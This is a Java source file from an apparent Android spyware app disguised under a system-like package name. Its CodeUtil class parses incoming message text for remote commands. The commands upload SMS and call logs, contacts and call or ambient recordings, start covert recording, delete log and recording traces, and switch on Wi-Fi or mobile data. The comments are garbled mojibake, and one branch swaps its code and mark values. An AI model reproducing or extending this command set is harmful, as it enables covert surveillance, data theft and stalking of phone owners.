package com.android.system.controled.util;

import java.io.File;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;

public class CodeUtil {

	private static final String TAG = "CodeUtil";

	/**
	 * �Ƿ���ָ��
	 * 
	 * @Description:
	 * @param msgTxt
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-10-15
	 */
	public static Code getCode(String msgTxt) {

		Code code = new Code();
		if (msgTxt.contains(MainApplication.PHONE_CODE_UP)) {
			code.setCode(MainApplication.PHONE_CODE_UP);
			code.setMark(MainApplication.PHONE_CODE_UP_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "��������������������");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_CALL_ME)) {
			code.setCode(MainApplication.PHONE_CODE_CALL_ME);
			code.setMark(MainApplication.PHONE_CODE_CALL_ME_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "����绰");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL)) {
			code.setRedoNeed(Code.REDO_NEED);
			// Debug.e(TAG, "�ϴ�����ͨ����¼");
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
			// Debug.e(TAG, "�ϴ�ͨ��¼��");
			code.setRedoNeed(Code.REDO_NEED);
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
			// Debug.e(TAG, "�ϴ�����¼��");
			code.setRedoNeed(Code.REDO_NEED);
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL)) {
			// Debug.e(TAG, "�ϴ�����");
			code.setRedoNeed(Code.REDO_NEED);
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_TIME)) {
			String words = msgTxt.substring(msgTxt.indexOf(MainApplication.PHONE_CODE_RECORD_TIME), msgTxt.length());
			String[] strs = words.split(":");
			if (strs.length == 2 && strs[1] != null) {
				code.setCode(MainApplication.PHONE_CODE_RECORD_TIME + strs[1]);
				code.setMark(MainApplication.PHONE_CODE_RECORD_TIME_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				// Debug.e(TAG, "¼��N����: " + strs[1]);
				return code;
			}
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS)) {
			code.setRedoNeed(Code.REDO_NEED);
			// Debug.e(TAG, "��ʼ�ϴ���ϵ��");
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MARK);
			}

			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_START)) {
			code.setCode(MainApplication.PHONE_CODE_RECORD_START);
			code.setMark(MainApplication.PHONE_CODE_RECORD_START_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "��ʼ¼��");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_END)) {
			// Debug.e(TAG, "����¼��");
			code.setCode(MainApplication.PHONE_CODE_RECORD_END);
			code.setMark(MainApplication.PHONE_CODE_RECORD_END_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DOWN)) {
			// Debug.e(TAG, "��������ȡ����");
			code.setCode(MainApplication.PHONE_CODE_DOWN);
			code.setMark(MainApplication.PHONE_CODE_DOWN_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_MSG_LOG);
			code.setMark(MainApplication.PHONE_CODE_DELETE_MSG_LOG_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "ɾ�����ż�¼");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_CALL_LOG);
			code.setMark(MainApplication.PHONE_CODE_DELETE_CALL_LOG_MARK);
			// Debug.e(TAG, "ɾ��ͨ����¼");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_WIFI)) {
			code.setCode(MainApplication.PHONE_CODE_TURNON_WIFI);
			code.setMark(MainApplication.PHONE_CODE_TURNON_WIFI_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "����wifi");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)) {
			code.setCode(MainApplication.PHONE_CODE_TURNON_MOBILE);
			code.setMark(MainApplication.PHONE_CODE_TURNON_MOBILE_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "����mobile network");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL);
			code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "ɾ��ͨ��¼����¼");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER_MARK);
			code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "ɾ������¼����¼");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_ALL_LOG);
			code.setMark(MainApplication.PHONE_CODE_DELETE_ALL_LOG_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "ɾ�����м�¼");
			return code;
		}

		return null;
	}

}
